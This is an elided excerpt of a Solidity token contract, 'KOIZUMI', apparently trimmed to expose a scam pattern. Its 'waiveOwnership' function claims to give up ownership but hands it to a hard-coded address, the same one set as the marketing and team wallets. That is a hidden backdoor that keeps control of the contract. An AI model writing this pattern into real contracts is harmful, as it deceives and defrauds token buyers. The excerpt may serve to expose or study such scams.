...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x557B30bdE0280CAdDa6EE74e771bedECe4Ad0995);
    }
...
contract KOIZUMI is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "KOIZUMI";
    string private _symbol = "KZM";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x557B30bdE0280CAdDa6EE74e771bedECe4Ad0995);
    address payable public teamWalletAddress = payable(0x557B30bdE0280CAdDa6EE74e771bedECe4Ad0995);
